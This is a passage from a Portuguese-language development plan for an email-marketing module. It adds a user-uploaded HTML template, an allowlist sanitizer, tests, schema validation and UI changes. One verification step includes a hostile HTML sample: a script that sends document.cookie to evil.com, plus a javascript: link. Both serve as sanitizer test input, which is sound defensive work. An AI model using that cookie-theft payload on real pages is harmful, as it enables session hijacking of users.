  it('injeta o link de descadastro', () => {
    expect(renderHtmlCustom(base)).toContain(UNSUB)
  })

  it('injeta o descadastro mesmo sem body', () => {
    const out = renderHtmlCustom({ ...base, html: '<p>sem body</p>' })
    expect(out).toContain(UNSUB)
  })

  it('substitui {{nome}} sem escapar o resto do documento', () => {
    const out = renderHtmlCustom(base)
    expect(out).toContain('Oi Ana')
    expect(out).toContain('<p>')
  })

  it('escapa o nome do destinatário', () => {
    const out = renderHtmlCustom({ ...base, nome: '<b>Ana</b>' })
    expect(out).not.toContain('<b>Ana</b>')
    expect(out).toContain('&lt;b&gt;Ana&lt;/b&gt;')
  })

  it('usa string vazia quando não há nome', () => {
    const out = renderHtmlCustom({ ...base, nome: null })
    expect(out).toContain('Oi ')
    expect(out).not.toContain('{{nome}}')
    expect(out).not.toContain('null')
  })

  it('injeta o preheader quando existe', () => {
    const out = renderHtmlCustom({ ...base, preheader: 'Prévia da caixa' })
    expect(out).toContain('Prévia da caixa')
  })

  it('sanitiza o html recebido', () => {
    const out = renderHtmlCustom({ ...base, html: '<p>ok</p><script>alert(1)</script>' })
    expect(out).not.toContain('alert(1)')
  })
})
```

- [ ] **Step 3: Rodar e confirmar que falha**

Run: `npm test -- lib/email/__tests__/html-custom.test.ts`
Expected: FAIL — `Cannot find module '../html-custom'`

- [ ] **Step 4: Implementar**

Criar `lib/email/html-custom.ts`. Reaproveite `escapeHtml` e `footer` de `./templates/shared` — o rodapé injetado tem de ser **o mesmo** dos outros templates, para o descadastro ser idêntico em toda campanha.

```ts
import sanitizeHtml from 'sanitize-html'
import { escapeHtml, footer, preheaderBlock } from './templates/shared'

/**
 * Sanitiza o HTML enviado pelo usuário.
 *
 * Os templates do módulo escapam todo conteúdo do usuário; aceitar HTML
 * arbitrário remove essa garantia inteira. Como o domínio de envio é
 * compartilhado com o 1-ano-SommaDay, um script ou pixel de terceiro num
 * e-mail nosso afeta a reputação dos dois sistemas — por isso a lista é
 * branca (o que não está previsto, sai), não negra.
 */
export function sanitizeCampaignHtml(raw: string): string {
  return sanitizeHtml(raw, {
    allowedTags: [
      'html', 'head', 'body', 'meta', 'title', 'style',
      'table', 'thead', 'tbody', 'tfoot', 'tr', 'td', 'th',
      'div', 'span', 'p', 'a', 'img', 'br', 'hr',
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'strong', 'b', 'em', 'i', 'u', 'small',
      'ul', 'ol', 'li', 'blockquote', 'center', 'font',
    ],
    allowedAttributes: {
      '*': ['style', 'class', 'align', 'valign', 'width', 'height', 'bgcolor', 'dir', 'lang'],
      a: ['href', 'target', 'rel'],
      img: ['src', 'alt', 'title', 'border'],
      table: ['role', 'cellpadding', 'cellspacing', 'border'],
      td: ['colspan', 'rowspan'],
      th: ['colspan', 'rowspan'],
      meta: ['charset', 'name', 'content'],
    },
    // Só esquemas que fazem sentido num e-mail. `javascript:` fica de fora.
    allowedSchemes: ['http', 'https', 'mailto'],
    allowedSchemesByTag: { img: ['http', 'https', 'data'] },
    allowProtocolRelative: false,
    // `style` é indispensável em e-mail (todo CSS é inline), mas <style> com
    // conteúdo hostil não é — o sanitizador já remove o que não for CSS.
    allowedStyles: {},
  })
}

interface RenderHtmlCustomArgs {
  html: string
  nome: string | null
  preheader?: string | null
  unsubscribeUrl: string
}

/**
 * Monta o corpo final de uma campanha com HTML próprio.
 *
 * O rodapé de descadastro é injetado por cima do HTML do usuário, sempre —
 * é exigência de LGPD e não pode depender de o autor do arquivo ter lembrado.
 */
export function renderHtmlCustom({
  html,
  nome,
  preheader,
  unsubscribeUrl,
}: RenderHtmlCustomArgs): string {
  let out = sanitizeCampaignHtml(html)

  // Diferente do `interpolate` dos outros templates, aqui só o NOME é escapado
  // — escapar o documento inteiro destruiria o HTML do usuário.
  const safeNome = nome ? escapeHtml(nome) : ''
  out = out.replace(/\{\{\s*nome\s*\}\}/g, () => safeNome)

  if (preheader) {
    const block = preheaderBlock(preheader)
    out = out.includes('<body')
      ? out.replace(/(<body[^>]*>)/i, `$1${block}`)
      : block + out
  }

  const rodape = footer(unsubscribeUrl)
  out = out.includes('</body>') ? out.replace(/<\/body>/i, `${rodape}</body>`) : out + rodape

  return out
}
```

> `.replace(/.../g, () => safeNome)` usa função de substituição de propósito: passar a string direto faria o JS interpretar `$&` e afins como token especial.

- [ ] **Step 5: Rodar e confirmar que passa**

Run: `npm test -- lib/email/__tests__/html-custom.test.ts`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add lib/email/html-custom.ts lib/email/__tests__/html-custom.test.ts package.json package-lock.json
git commit -m "feat(email): sanitização e injeções do template de HTML próprio"
```

---

## Task 9: `html_custom` como quarto template

**Files:**
- Modify: `lib/email/templates/index.ts`
- Modify: `lib/email/validation.ts`
- Test: `lib/email/__tests__/templates.test.ts` (acrescentar)

**Interfaces:**
- Consumes: `renderHtmlCustom` (Task 8).
- Produces: `TEMPLATE_KEYS` passa a ser `['anuncio','simples','evento','html_custom']`; `TemplateFields` ganha `html?: string`.

- [ ] **Step 1: Escrever os testes que falham**

Acrescente a `lib/email/__tests__/templates.test.ts`:

```ts
describe('renderTemplate com html_custom', () => {
  const base = {
    templateKey: 'html_custom' as const,
    subject: 'Assunto',
    preheader: 'Prévia',
    content: { titulo: '', texto: '', html: '<body><p>Oi {{nome}}</p></body>' },
    ctaLabel: null,
    ctaUrl: null,
    nome: 'Ana',
    unsubscribeUrl: 'https://admin.sommaclub.com.br/api/unsubscribe?t=abc',
  }

  it('expõe html_custom entre os templates', () => {
    expect(TEMPLATE_KEYS).toContain('html_custom')
  })

  it('usa o html do usuário como corpo', () => {
    expect(renderTemplate(base)).toContain('Oi Ana')
  })

  it('injeta o link de descadastro', () => {
    expect(renderTemplate(base)).toContain('/api/unsubscribe?t=abc')
  })

  it('sanitiza o html', () => {
    const out = renderTemplate({
      ...base,
      content: { titulo: '', texto: '', html: '<p>ok</p><script>alert(1)</script>' },
    })
    expect(out).not.toContain('alert(1)')
  })

  it('não envolve no documento padrão dos outros templates', () => {
    // O HTML do usuário É o documento; envolvê-lo criaria <html> aninhado.
    const out = renderTemplate(base)
    expect((out.match(/<body/gi) ?? []).length).toBeLessThanOrEqual(1)
  })
})
```

- [ ] **Step 2: Rodar e confirmar que falha**

Run: `npm test -- lib/email/__tests__/templates.test.ts`
Expected: FAIL

- [ ] **Step 3: Estender os templates**

Em `lib/email/templates/index.ts`:

```ts
export const TEMPLATE_KEYS = ['anuncio', 'simples', 'evento', 'html_custom'] as const

export interface TemplateFields {
  titulo: string
  texto: string
  imagem_url?: string
  data?: string
  local?: string
  /** Só para o template `html_custom`. */
  html?: string
}
```

Em `renderTemplate`, trate `html_custom` **antes** dos demais e retorne direto, sem passar pelo `document()`:

```ts
if (templateKey === 'html_custom') {
  // O HTML do usuário já é o documento inteiro — envolvê-lo no `document()`
  // dos outros templates criaria <html> dentro de <html>.
  return renderHtmlCustom({
    html: content.html ?? '',
    nome,
    preheader,
    unsubscribeUrl,
  })
}
```

- [ ] **Step 4: Validação condicional ao template**

Em `lib/email/validation.ts`, `content` passa a exigir campos diferentes conforme o template. Acrescente `html` ao objeto de conteúdo e valide a combinação com `.superRefine` no schema de campanha:

```ts
// dentro do objeto `content`
html: z.string().max(100_000, 'O HTML deve ter no máximo 100 KB').optional(),
```

E, no `campaignFieldsSchema`, depois do `.object({...})`:

```ts
.superRefine((data, ctx) => {
  // Só valida a combinação quando o template veio no payload (o PATCH é parcial).
  if (!data.template_key || !data.content) return

  if (data.template_key === 'html_custom') {
    if (!data.content.html?.trim()) {
      ctx.addIssue({
        code: z.ZodIssueCode.custom,
        path: ['content', 'html'],
        message: 'Envie um arquivo HTML',
      })
    }
    return
  }

  if (!data.content.titulo?.trim()) {
    ctx.addIssue({ code: z.ZodIssueCode.custom, path: ['content', 'titulo'], message: 'Título obrigatório' })
  }
  if (!data.content.texto?.trim()) {
    ctx.addIssue({ code: z.ZodIssueCode.custom, path: ['content', 'texto'], message: 'Texto obrigatório' })
  }
})
```

Isso exige que `titulo` e `texto` deixem de ser obrigatórios no `z.object` (viram `.optional()`), passando a ser exigidos pelo `.superRefine` só quando o template não é `html_custom`.

**Armadilha concreta, já verificada:** `.superRefine` devolve um `ZodEffects`, que **não tem** `.partial()` nem `.strict()`. E `campaignFieldsSchema` é consumido de duas formas hoje:

- `app/api/email-campaigns/route.ts:12` — `const createSchema = campaignFieldsSchema`
- `app/api/email-campaigns/[id]/route.ts:18` — `const patchSchema = campaignFieldsSchema.partial().strict(...)`

Se você aplicar o `.superRefine` direto no `campaignFieldsSchema`, a rota de PATCH quebra na compilação.

**Solução:** mantenha `campaignFieldsSchema` como `ZodObject` puro e exporte o refine como uma função aplicável:

```ts
/** Exige os campos certos conforme o template. Aplicar por último, depois de
 *  qualquer `.partial()`/`.strict()` — `.superRefine` devolve ZodEffects, que
 *  não tem esses métodos. */
export function withContentRules<T extends z.ZodTypeAny>(schema: T) {
  return schema.superRefine((data: any, ctx: z.RefinementCtx) => {
    if (!data?.template_key || !data?.content) return
    // ... as regras acima
  })
}
```

E aplique nos dois call sites:

```ts
// create
const createSchema = withContentRules(campaignFieldsSchema)
// patch
const patchSchema = withContentRules(campaignFieldsSchema.partial().strict('Campo não permitido em edição de campanha'))
```

Confirme que a mensagem de `.strict()` do PATCH continua idêntica à atual — ela é verificada por comportamento na rota.

- [ ] **Step 5: Rodar e confirmar que passa**

Run: `npm test`
Expected: tudo passando, incluindo os testes novos e os que já existiam.

Run: `npx tsc --noEmit` — sem erro novo.

- [ ] **Step 6: Commit**

```bash
git add lib/email/templates/index.ts lib/email/validation.ts lib/email/__tests__/templates.test.ts
git commit -m "feat(email): html_custom como quarto template, com validação por tipo"
```

---

## Task 10: Interface do upload de HTML

**Files:**
- Modify: `components/email-content-form.tsx`
- Modify: `components/email-campaign-modal.tsx`

**Interfaces:**
- Consumes: `TEMPLATE_KEYS` com `html_custom` (Task 9).

- [ ] **Step 1: Acrescentar o quarto card ao seletor de template**

Em `components/email-content-form.tsx`, o seletor de template é uma lista com rótulo e descrição por template. Acrescente:

```ts
{ key: 'html_custom', label: 'HTML próprio', desc: 'Suba um arquivo .html pronto' }
```

O grid do seletor hoje é `grid-cols-1 sm:grid-cols-3`. Com quatro opções, troque por `grid-cols-1 sm:grid-cols-2 lg:grid-cols-4`.

Se houver um `Record<TemplateKey, string>` de rótulos em `components/email-campaign-modal.tsx`, acrescente a chave lá também — sem isso o TypeScript quebra.

- [ ] **Step 2: Trocar os campos quando o template for `html_custom`**

Quando `templateKey === 'html_custom'`, o formulário esconde Título, Texto, Imagem, Data, Local e CTA, e mostra:

- Um `<input type="file" accept=".html,text/html">`.
- O nome do arquivo carregado e o tamanho em KB.
- Um botão para remover o arquivo carregado.

Assunto e preheader continuam visíveis — eles não vêm do HTML.

Leitura no navegador, sem upload separado:

```tsx
async function handleFile(file: File) {
  const LIMITE = 100 * 1024
  if (file.size > LIMITE) {
    setFileError('O arquivo tem mais de 100 KB. O Gmail corta e-mails desse tamanho.')
    return
  }
  const texto = await file.text()
  setFileError(null)
  onContentChange({ ...content, html: texto })
  setFileName(file.name)
}
```

> O limite é checado no cliente para dar retorno imediato, e de novo no servidor pelo zod da Task 9 — o cliente é conveniência, o servidor é a garantia.

- [ ] **Step 3: Ajustar o gate de avanço do passo 2**

Em `components/email-campaign-modal.tsx`, o gate que habilita "Próximo" no passo 2 hoje exige `content.titulo` e `content.texto`. Passa a depender do template:

```ts
const conteudoValido =
  templateKey === 'html_custom'
    ? Boolean(content.html?.trim())
    : Boolean(content.titulo?.trim() && content.texto?.trim())

const canGoStep2To3 = nome.trim().length >= 2 && subject.trim().length >= 2 && conteudoValido
```

- [ ] **Step 4: Verificar**

Run: `npm test` — sem regressão.
Run: `npx tsc --noEmit` — sem erro novo.
Run: `npx next build` — compila.

- [ ] **Step 5: Commit**

```bash
git add components/email-content-form.tsx components/email-campaign-modal.tsx
git commit -m "feat(email): upload de arquivo .html como template da campanha"
```

---

## Task 11: Validação final

**Files:** nenhum arquivo novo — é a verificação do conjunto.

- [ ] **Step 1: Suíte completa**

Run: `npm test`
Expected: todas as suítes passando. Baseline era 297; espere ~330 com os testes novos.

- [ ] **Step 2: Tipos e build**

Run: `npx tsc --noEmit`
Expected: nenhum erro em arquivo do módulo de e-mail. (A baseline tem erros pré-existentes em arquivos alheios — compare com o estado inicial do worktree.)

Run: `npx next build`
Expected: compila; `/email-marketing` e `/api/email-audiences/pessoas` aparecem na listagem de rotas.

- [ ] **Step 3: Verificar o guard da rota nova**

Run: `npm run dev` e:

```bash
curl -s -o /dev/null -w "%{http_code}\n" "http://localhost:3000/api/email-audiences/pessoas?q=ana"
```

Expected: `401`

- [ ] **Step 4: Verificar a sanitização de ponta a ponta**

Sem sessão autenticada não dá para exercitar o fluxo pela interface. Em vez disso, escreva um script temporário **fora do repositório** (no diretório de scratch) que importe `renderTemplate` de `lib/email/templates` e renderize uma campanha `html_custom` com um HTML hostil:

```html
<body>
  <p>Oi {{nome}}</p>
  <script>fetch('https://evil.com?c='+document.cookie)</script>
  <a href="javascript:alert(1)">clique</a>
  <img src="https://ok.com/pixel.png" />
</body>
```

Confirme na saída que: o `<script>` sumiu, o `href` `javascript:` sumiu, o `<img>` https permaneceu, `{{nome}}` foi substituído, e o link de descadastro está presente. Apague o script ao final.

- [ ] **Step 5: Commit final**

```bash
git add -A
git commit -m "chore(email): validação final do v2"
```

---

## Notas de implantação

Nada aqui exige migração de banco nem variável de ambiente nova.

As pendências do v1 continuam abertas e **não** são resolvidas por este trabalho: as variáveis de ambiente em produção (`RESEND_API_KEY`, `EMAIL_FROM`, `NEXT_PUBLIC_APP_URL`, `CRON_SECRET`, `RESEND_WEBHOOK_SECRET`), o registro do webhook na Resend, os achados I4/N2/N3/N4 da revisão final, a verificação manual no navegador e a decisão de consentimento para as bases grandes.
